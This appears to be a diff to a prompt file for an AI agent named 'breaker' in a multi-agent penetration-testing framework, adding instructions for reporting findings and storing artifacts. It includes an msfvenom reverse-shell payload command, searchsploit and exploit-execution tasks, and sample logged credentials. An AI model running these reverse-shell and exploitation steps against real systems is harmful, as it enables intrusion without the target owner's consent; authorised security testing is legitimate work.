@@ -206,11 +206,69 @@ CVE-XXXX-XXXXX
 [Patch version or mitigation]
 ```
 
+## Parallel Mode Output
+
+When running as a hunter in parallel mode, write findings to shared state:
+
+### Writing Findings to Shared State
+```bash
+# Set environment
+export GHOST_ENGAGEMENT="/tmp/ghost/active"
+export GHOST_AGENT="breaker"
+HUNTER_DIR="/tmp/ghost/active/hunters/breaker"
+
+# Report discovered vulnerabilities
+~/.claude/scripts/ghost-findings.sh add critical "CVE-2024-XXXX - RCE" "Remote code execution via deserialization"
+~/.claude/scripts/ghost-findings.sh add critical "Buffer Overflow - Shell Obtained" "Stack BOF in custom service, reverse shell achieved"
+~/.claude/scripts/ghost-findings.sh add high "CVE-2023-YYYY Exploitable" "Confirmed vulnerable version, PoC available"
+
+# Report successful exploitation
+~/.claude/scripts/ghost-findings.sh add critical "Initial Access Achieved" "Reverse shell obtained as www-data via SQLi"
+
+# Report credentials discovered via exploitation
+~/.claude/scripts/ghost-findings.sh cred "www-data" "[shell access]" "exploitation" access
+~/.claude/scripts/ghost-findings.sh cred "db_user" "DbP@ss123" "config_file" password
+
+# Store evidence
+mkdir -p "$HUNTER_DIR/evidence"
+echo "[Exploit output]" > "$HUNTER_DIR/evidence/exploit-output.txt"
+```
+
+### Working Directory
+Write detailed outputs to hunter working directory:
+```bash
+# Store CVE research
+searchsploit $SOFTWARE $VERSION > "$HUNTER_DIR/searchsploit-results.txt"
+
+# Store exploit code and modifications
+cp exploit.py "$HUNTER_DIR/exploit.py"
+
+# Store shellcode and payloads
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f python > "$HUNTER_DIR/shellcode.py"
+
+# Store exploitation logs
+script -q "$HUNTER_DIR/exploit-session.log"
+```
+
+### Parallel Task Focus
+When dispatched by COMMAND, focus on ONE task:
+- `cve_research`: Search for CVEs, analyze exploitability
+- `exploit_dev`: Develop or modify exploit code
+- `payload_gen`: Generate shellcode and payloads
+- `exploit_exec`: Execute validated exploits
+- `web_exploit`: Web-based exploitation (SQLi to shell, file upload)
+
+### Task Completion
+```bash
+~/.claude/scripts/ghost-dispatch.sh complete "$TASK_ID" success
+```
+
 ## Integration
 
 - **Input from @shadow**: Target versions, software inventory
 - **Input from @spider**: Web vulnerabilities requiring exploitation
 - **Input from @phantom**: Network service vulnerabilities
+- **Triggered by**: Vulnerability findings requiring exploitation
 - **Output to @persistence**: Initial access via exploits
 - **Output to @scribe**: Exploitation details, PoC code
 
